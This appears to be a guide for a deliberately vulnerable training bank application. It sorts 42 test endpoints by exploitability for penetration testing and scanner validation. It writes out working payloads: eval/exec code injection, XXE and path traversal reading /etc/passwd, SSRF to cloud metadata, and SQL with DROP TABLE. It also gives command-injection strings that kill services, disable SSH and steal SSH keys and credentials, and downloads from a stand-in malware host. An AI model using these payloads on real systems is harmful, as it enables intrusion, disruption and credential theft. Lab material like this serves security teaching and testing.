# Flask Endpoint Exploitability Guide

This document categorises the 42 vulnerability testing endpoints on the Flask server (port 8888) by their actual exploitability level. It clarifies which endpoints can be used for hands-on penetration testing versus which are primarily for static analysis scanner detection.

Note: This guide covers security testing endpoints only. Public pages (/, /netbank, /business, /investments, /digital, /signup, /disclaimer) are standard UI routes not intended for exploitation.

## Categorisation Legend

- **Truly Exploitable** - Actually executes vulnerable code; can be used for hands-on penetration testing
- **Partially Exploitable** - Executes some vulnerable code with limitations or simulated behaviour
- **Simulation Only** - Returns configuration strings/messages for SAST scanner detection only

---

## Truly Exploitable Endpoints (30)

These endpoints actually execute vulnerable code and can be exploited for hands-on testing:

### 1. `/debug` - Information Disclosure
- **Exploitability**: Actually returns real system information, environment variables, request headers, and app configuration
- **Testing**: `curl http://localhost:8888/debug`
- **Impact**: Exposes sensitive system data, Python paths, environment secrets

### 2. `/log/<message>` - Log Injection
- **Exploitability**: Actually logs user input directly to application logs
- **Testing**: `curl http://localhost:8888/log/malicious_input`
- **Impact**: Log poisoning, log injection attacks

### 3. `/comment` - Cross-Site Scripting (XSS)
- **Exploitability**: Actually renders unescaped HTML/JavaScript directly in response
- **Testing**: `curl "http://localhost:8888/comment?comment=<script>alert('XSS')</script>"`
- **Impact**: Stored/reflected XSS, JavaScript execution in browser

### 4. `/hash` - Weak Cryptography
- **Exploitability**: Actually generates MD5 hashes of user input
- **Testing**: `curl "http://localhost:8888/hash?password=secret123"`
- **Impact**: Demonstrates weak hashing algorithm usage

### 5. `/deserialize` - Remote Code Execution via Pickle
- **Exploitability**: Actually deserialises base64-encoded pickle data (can execute arbitrary Python code)
- **Testing**: Craft malicious pickle payload with `__reduce__` method
- **Impact**: **CRITICAL** - Full remote code execution possible

### 6. `/fetch` - Server-Side Request Forgery (SSRF)
- **Exploitability**: Actually makes HTTP requests to user-specified URLs with SSL verification disabled
- **Testing**: `curl "http://localhost:8888/fetch?url=http://169.254.169.254/latest/meta-data/"`
- **Impact**: Access to internal services, cloud metadata, port scanning

### 7. `/xml` (POST) - XML External Entity (XXE)
- **Exploitability**: Actually parses XML with external entities enabled (Python ElementTree has limited XXE by default)
- **Testing**: `curl -X POST "http://localhost:8888/xml" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'`
- **Impact**: Limited by Python's ElementTree implementation (safer than Java/PHP parsers)

### 8. `/xml` (GET) - XML External Entity (XXE)
- **Exploitability**: Actually parses XML from query parameter
- **Testing**: `curl "http://localhost:8888/xml?data=<root>test</root>"`
- **Impact**: Same limitations as POST version

### 9. `/redirect` - HTTP Header Injection
- **Exploitability**: Actually sets Location header and insecure cookies based on user input
- **Testing**: `curl -I "http://localhost:8888/redirect?url=http://malware.sigre.xyz"`
- **Impact**: Open redirect, cookie manipulation

### 10. `/json` - Code Injection via eval()
- **Exploitability**: Actually executes eval() on user input
- **Testing**: `curl "http://localhost:8888/json?data=key:__import__('os').system('whoami')"`
- **Impact**: **CRITICAL** - Arbitrary Python code execution

### 11. `/template` - Cross-Site Scripting (XSS)
- **Exploitability**: Actually marks user input as safe HTML using Markup()
- **Testing**: `curl "http://localhost:8888/template?input=<img src=x onerror=alert('XSS')>"`
- **Impact**: XSS via template injection

### 12. `/html` - Cross-Site Scripting (XSS)
- **Exploitability**: Actually renders unsanitised HTML tags
- **Testing**: `curl "http://localhost:8888/html?html=<script>alert('XSS')</script>"`
- **Impact**: HTML injection, XSS attacks

### 13. `/exception` - Improper Exception Handling
- **Exploitability**: Actually triggers exceptions and silently fails
- **Testing**: `curl "http://localhost:8888/exception?type=division"`
- **Impact**: Information disclosure through error behaviour

### 14. `/none` - Null Pointer Access
- **Exploitability**: Actually attempts to access None attributes
- **Testing**: `curl http://localhost:8888/none`
- **Impact**: Demonstrates improper null handling

### 15. `/wildcard` - Path Traversal via Glob
- **Exploitability**: Actually executes glob.glob() with user-controlled patterns
- **Testing**: `curl "http://localhost:8888/wildcard?pattern=../../etc/*"`
- **Impact**: File system enumeration, path traversal

### 16. `/admin` - Broken Access Control
- **Exploitability**: Actually grants admin access with any non-empty role parameter
- **Testing**: `curl "http://localhost:8888/admin?role=attacker"`
- **Impact**: Authentication/authorisation bypass

### 17. `/encrypt` - Weak Encryption
- **Exploitability**: Actually encrypts data using AES-CBC with static IV
- **Testing**: `curl "http://localhost:8888/encrypt?data=secret"`
- **Impact**: Predictable encryption, IV reuse attacks

### 18. `/keyexchange` - Insecure Key Generation
- **Exploitability**: Actually generates RSA keypairs with weak 1024-bit size
- **Testing**: `curl http://localhost:8888/keyexchange`
- **Impact**: Weak cryptographic key strength

### 19. `/transfer` - CSRF Vulnerability
- **Exploitability**: Actually processes POST requests without CSRF tokens
- **Testing**: `curl -X POST -d "amount=1000&to_account=attacker" http://localhost:8888/transfer`
- **Impact**: Cross-site request forgery attacks

### 20. `/ml_model` - Insecure File Download
- **Exploitability**: Actually makes HTTP requests to download files without integrity checks
- **Testing**: `curl "http://localhost:8888/ml_model?url=http://malware.sigre.xyz/malware.pkl"`
- **Impact**: Supply chain attacks, malicious model loading

### 21. `/permissions` - Insecure File Permissions
- **Exploitability**: Actually creates files with 777 permissions
- **Testing**: `curl "http://localhost:8888/permissions?file=test.txt&content=secret"`
- **Impact**: World-readable/writable files created in /tmp

### 22. `/download` - Path Traversal
- **Exploitability**: Actually attempts to open and read files with user-controlled paths using open()
- **Testing**: `curl "http://localhost:8888/download?file=../../../../etc/passwd"`
- **Impact**: Arbitrary file read via path traversal

### 23. `/config` - Code Injection via exec()
- **Exploitability**: Actually executes exec() on user input
- **Testing**: `curl "http://localhost:8888/config?config=__import__('os').system('whoami')=1"`
- **Impact**: **CRITICAL** - Arbitrary Python code execution via exec()

### 24. `/resource` - Resource Consumption
- **Exploitability**: Actually allocates memory based on user input without limits (multiplies by 1M)
- **Testing**: `curl "http://localhost:8888/resource?size=1000"`
- **Impact**: Uncontrolled resource consumption, potential denial of service

### 25. `/random` - Predictable Random Number Generation (CWE-330)
- **Exploitability**: Uses fixed seed 12345 for random number generation, attacker can predict all values
- **Testing**: `curl "http://localhost:8888/random"`
- **Impact**: Predictable PRNG output enables bypassing security controls relying on randomness

### 26. `/credentials` - Cleartext Credential Storage (CWE-312)
- **Exploitability**: Exposes real credentials admin:password123 in cleartext response
- **Testing**: `curl "http://localhost:8888/credentials"`
- **Impact**: Direct credential disclosure, authentication bypass

### 27. `/pytorch` - Insecure Model Download (CWE-494)
- **Exploitability**: Downloads pickle files from user-specified URLs without hash verification
- **Testing**: `curl "http://localhost:8888/pytorch?url=http://malware.sigre.xyz/malicious.pkl"`
- **Impact**: Supply chain attacks, arbitrary code execution via malicious pickle payloads

### 28. `/dh_exchange` - Inadequate Encryption Strength (CWE-326)
- **Exploitability**: Generates actual 512-bit Diffie-Hellman parameters vulnerable to MITM attacks
- **Testing**: `curl "http://localhost:8888/dh_exchange"`
- **Impact**: Weak key exchange susceptible to cryptographic attacks and interception

### 29. `/tensorflow` - Insecure Model Download (CWE-494)
- **Exploitability**: Downloads model files from user-specified URLs without hash verification
- **Testing**: `curl "http://localhost:8888/tensorflow?url=http://malware.sigre.xyz/malicious_model"`
- **Impact**: Supply chain attacks, potential code execution via malicious model loading

### 30. `/database` - SQL Injection (CWE-89)
- **Exploitability**: Executes raw SQL via op=query&query= parameter without sanitisation
- **Testing**: `curl "http://localhost:8888/database?op=query&query=SELECT * FROM users; DROP TABLE users;--"`
- **Impact**: Full database access, data exfiltration, data manipulation

---

## Partially Exploitable Endpoints (6)

These endpoints execute some code but with limitations or simulated behaviour:

### 31. `/search` - SQL Injection (Simulated)
- **Exploitability**: Constructs SQL query string but doesn't execute it (no database connection)
- **Testing**: `curl "http://localhost:8888/search?q=' OR '1'='1"`
- **Limitation**: Returns query string only; no actual database query execution
- **Purpose**: SAST scanner detection for SQL injection patterns

### 32. `/ldap` - LDAP Injection (Simulated)
- **Exploitability**: Constructs LDAP filter string but doesn't execute it
- **Testing**: `curl "http://localhost:8888/ldap?user=admin)(|(password=*)"`
- **Limitation**: Returns filter string only; no actual LDAP query execution
- **Purpose**: SAST detection for LDAP injection patterns

### 33. `/file` - Path Traversal (Simulated)
- **Exploitability**: Constructs file path but doesn't actually read the file
- **Testing**: `curl "http://localhost:8888/file?name=../../../../etc/passwd"`
- **Limitation**: Returns path string only; no actual file reading
- **Purpose**: SAST detection for path traversal patterns

### 34. `/mongo` - NoSQL Injection (Simulated)
- **Exploitability**: Constructs MongoDB query string but doesn't execute it
- **Testing**: `curl "http://localhost:8888/mongo?id=' || '1'=='1"`
- **Limitation**: Returns query string only; no actual MongoDB connection
- **Purpose**: SAST detection for NoSQL injection

### 35. `/token` - JWT Without Verification
- **Exploitability**: Actually decodes JWT without signature verification
- **Testing**: `curl "http://localhost:8888/token?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.invalid"`
- **Limitation**: Decodes but doesn't use the payload for anything; demonstration only
- **Purpose**: Shows insecure JWT handling pattern

### 36. `/exhaust` - Resource Exhaustion
- **Exploitability**: Actually allocates memory but limited to prevent crashes
- **Testing**: `curl "http://localhost:8888/exhaust?size=50000"`
- **Limitation**: Capped at 100KB to prevent DoS
- **Purpose**: Demonstrates resource exhaustion with safety limits

---

## Simulation Only Endpoints (6)

These endpoints only return configuration strings/messages for SAST scanner detection:

### 37. `/email` - Cleartext SMTP Config
- **Exploitability**: Returns SMTP configuration dict; no actual email sent
- **Purpose**: SAST detection for insecure SMTP configuration

### 38. `/ssl_test` - Weak SSL/TLS Config
- **Exploitability**: Creates SSL context object but doesn't use it
- **Purpose**: SAST detection for weak SSL configuration patterns

### 39. `/redis` - Redis Config Without SSL
- **Exploitability**: Returns Redis configuration dict; no actual Redis connection
- **Purpose**: SAST detection for insecure Redis configuration

### 40. `/custom_scheme` - Custom URL Scheme
- **Exploitability**: Returns message about handling custom URL
- **Purpose**: SAST detection for improper URL scheme authorisation

### 41. `/ldap_anon` - LDAP Anonymous Bind
- **Exploitability**: Returns LDAP configuration dict; no actual LDAP connection
- **Purpose**: SAST detection for anonymous LDAP binding

### 42. `/ipmi` - Insecure IPMI Config
- **Exploitability**: Returns IPMI configuration dict
- **Purpose**: SAST detection for insecure IPMI settings

---

## Summary Statistics

| Category | Count | Percentage |
|----------|-------|------------|
| Truly Exploitable | 30 | 71% |
| Partially Exploitable | 6 | 14% |
| Simulation Only | 6 | 14% |
| Total Endpoints | 42 | 100% |

---

## Critical Findings for Hands-On Testing

### Highest Risk Endpoints (RCE Potential):
1. **`/deserialize`** - Full RCE via malicious pickle payloads
2. **`/json`** - Code injection via eval()
3. **`/config`** - Code injection via exec()

### Network Attack Vectors:
- **`/fetch`** - SSRF for accessing internal services and metadata endpoints
- **`/ml_model`** - Download arbitrary files from attacker-controlled servers

### XSS Endpoints (3):
- `/comment`, `/template`, `/html` - All render unsanitised HTML/JavaScript

### Information Disclosure:
- **`/debug`** - Exposes full environment variables, secrets, configuration

---

## Recommendations for Testing

### For Hands-On Penetration Testing:
Focus on the 30 Truly Exploitable endpoints, especially:
- `/deserialize` for RCE exploitation
- `/fetch` for SSRF attacks
- `/debug` for information gathering
- `/json` for code injection

### For SAST Scanner Validation:
All 42 endpoints are valuable for testing static analysis tools, as they contain:
- Vulnerable code patterns (exploitable endpoints)
- Insecure configurations (simulation endpoints)
- Real hardcoded secrets and credentials

### For Dynamic Analysis (DAST):
The Truly Exploitable and Partially Exploitable endpoints (36 total) will trigger DAST scanners effectively.

---

## Important Notes

1. **Python ElementTree XXE Limitations**: The `/xml` endpoints use Python's ElementTree which has built-in protections against XXE. For full XXE testing, use the Tomcat Java endpoints on port 9999.

2. **Database-Dependent Endpoints**: Endpoints like `/search`, `/ldap`, `/mongo` return query strings but don't execute them due to lack of backend connections. They're designed for SAST pattern detection.

3. **Tomcat Endpoints for Real Exploits**: For actual RCE exploitation with full impact, use the Tomcat endpoints on port 9999 (Spring4Shell, command injection, file upload).

4. **Safety Limitations**: Some endpoints have safety caps (e.g., `/exhaust`) to prevent container crashes during testing.

---

## BB-REQ-009: Service Restart / Control Capability

The ExecuteServlet provides arbitrary command execution enabling attacker-controlled stopping and restarting of services.

### Vulnerable Endpoint

```
http://localhost:9999/exploit-app/execute?cmd=<command>
```

### Technical Implementation

The endpoint uses `Runtime.getRuntime().exec()` with unsanitised user input, allowing execution of any system command including service control utilities.

### Exploitation Scenarios

**1. Process Termination (Denial of Service)**
```bash
# Kill all Java processes (including the application)
curl "http://localhost:9999/exploit-app/execute?cmd=pkill+-9+java"

# Kill specific process by name
curl "http://localhost:9999/exploit-app/execute?cmd=killall+python3"

# Kill process by PID (after discovery)
curl "http://localhost:9999/exploit-app/execute?cmd=kill+-9+1234"
```

**2. Service Control via Supervisord**
```bash
# List supervised services
curl "http://localhost:9999/exploit-app/execute?cmd=supervisorctl+status"

# Restart all services
curl "http://localhost:9999/exploit-app/execute?cmd=supervisorctl+restart+all"

# Stop specific service
curl "http://localhost:9999/exploit-app/execute?cmd=supervisorctl+stop+flask"
```

**3. Systemd Service Control (if available)**
```bash
# Stop a service
curl "http://localhost:9999/exploit-app/execute?cmd=systemctl+stop+nginx"

# Restart a service
curl "http://localhost:9999/exploit-app/execute?cmd=systemctl+restart+apache2"

# Disable service at boot
curl "http://localhost:9999/exploit-app/execute?cmd=systemctl+disable+ssh"
```

**4. Process Discovery for Targeted Attacks**
```bash
# List running processes
curl "http://localhost:9999/exploit-app/execute?cmd=ps+aux"

# Find processes by name
curl "http://localhost:9999/exploit-app/execute?cmd=pgrep+-la+python"

# Show listening ports
curl "http://localhost:9999/exploit-app/execute?cmd=netstat+-tlnp"
```

### MITRE ATT&CK Coverage

| Technique | ID | Description |
|-----------|-----|-------------|
| Service Stop | T1489 | Stopping services to disrupt availability |
| Disable or Modify Tools | T1562.001 | Disabling security tools or monitoring |
| Endpoint Denial of Service | T1499 | Resource exhaustion through service manipulation |

### Detection Opportunities

- Monitor for command execution patterns containing service control keywords
- Alert on process termination signals from web application contexts
- Track supervisorctl/systemctl invocations from non-administrative processes

---

## BB-REQ-012: Exposed Local Git Repository

The application creates a vulnerable git repository at startup containing a fictional "top secret" project with planted credentials and intellectual property.

### Repository Location

```
<project_root>/data/projects/mars-banking-initiative/
```

Note: In Docker deployments, this may be at `/var/lib/brokenbank/projects/mars-banking-initiative/` depending on configuration.

### Contents

- **Project Ares**: Fictional Mars Banking Initiative by GoCortex IO and SimonSigre.com
- **Source Code**: SpaceATM, Mars Gateway, Orbital Auth, Quantum Ledger modules
- **Planted Secrets**: AWS keys, API tokens, SSH keys, database passwords, JWT secrets
- **Confidential Documents**: Financial projections, patent strategy, team compensation

### Exploitation Scenarios

**1. Repository Discovery and Cloning**
```bash
# Discover the repository using command injection (find .git directories)
curl "http://localhost:9999/exploit-app/execute?cmd=find+.+-name+.git+-type+d+2>/dev/null"

# Clone the entire repository (path varies by deployment - use find output)
# Docker: /var/lib/brokenbank/projects/mars-banking-initiative
# Local: ./data/projects/mars-banking-initiative
curl "http://localhost:9999/exploit-app/execute?cmd=git+clone+./data/projects/mars-banking-initiative+/tmp/stolen"
```

**2. Credential Extraction from Git History**
```bash
# List all files in repository
curl "http://localhost:9999/exploit-app/execute?cmd=ls+-la+./data/projects/mars-banking-initiative/"

# Extract credentials from config
curl "http://localhost:9999/exploit-app/execute?cmd=cat+./data/projects/mars-banking-initiative/config/credentials.json"
```

**3. SSH Key Theft**
```bash
# Extract SSH private key
curl "http://localhost:9999/exploit-app/execute?cmd=cat+./data/projects/mars-banking-initiative/.ssh/id_rsa"
```

**4. Git Archive for Exfiltration**
```bash
# Create archive of repository
curl "http://localhost:9999/exploit-app/execute?cmd=cd+./data/projects/mars-banking-initiative+%26%26+git+archive+--format=tar+HEAD+>+/tmp/exfil.tar"
```

### MITRE ATT&CK Coverage

| Technique | ID | Description |
|-----------|-----|-------------|
| Data from Local System | T1005 | Accessing local files containing sensitive data |
| Unsecured Credentials | T1552 | Credentials stored in files (config, .env, JSON) |
| Data from Information Repositories | T1213 | Source code and documentation theft |

### Planted Secrets (For Scanner Detection)

| Secret Type | Location | Example Value |
|-------------|----------|---------------|
| AWS Access Key | config/production.yaml | AKIAIOSFODNN7EXAMPLE |
| Database Password | config/.env.production | Pr0d_DB_P@ss_2028! |
| SSH Private Key | .ssh/id_rsa | OpenSSH RSA key |
| JWT Secret | src/orbital_auth.py | ares_jwt_secret_2028_prod |
| Stripe Secret Key | src/mars_gateway.py | sk_live_51H8xyz... |
| GitHub PAT | src/orbital_auth.py | ghp_xxxxxxx |

---

**Last Updated**: Version 1.3.6
